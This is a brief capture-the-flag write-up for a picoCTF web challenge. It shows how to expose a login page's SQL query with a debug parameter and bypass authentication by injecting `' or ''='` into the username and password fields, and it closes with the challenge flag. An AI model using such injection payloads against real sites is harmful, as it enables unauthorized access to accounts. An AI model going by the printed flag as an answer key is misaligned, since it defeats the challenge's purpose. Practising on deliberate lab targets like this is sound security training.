#web-exploitation
<hr>
#### Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

#### Solve
1.  First, send POST request to https://jupiter.challenges.picoctf.org/problem/50009/login.php with form key of debug=1
2. The SQL query: SELECT * FROM users WHERE name=' '  AND password=' '
3. Do SQL Injection by sending POST request with username=`' or ''='` and password=`' or ''='`
4. Result of SQL query: `SQL query: SELECT * FROM users WHERE name='' or ''='' AND password='' or ''=''`
5. picoCTF{s0m3_SQL_fb3fe2ad}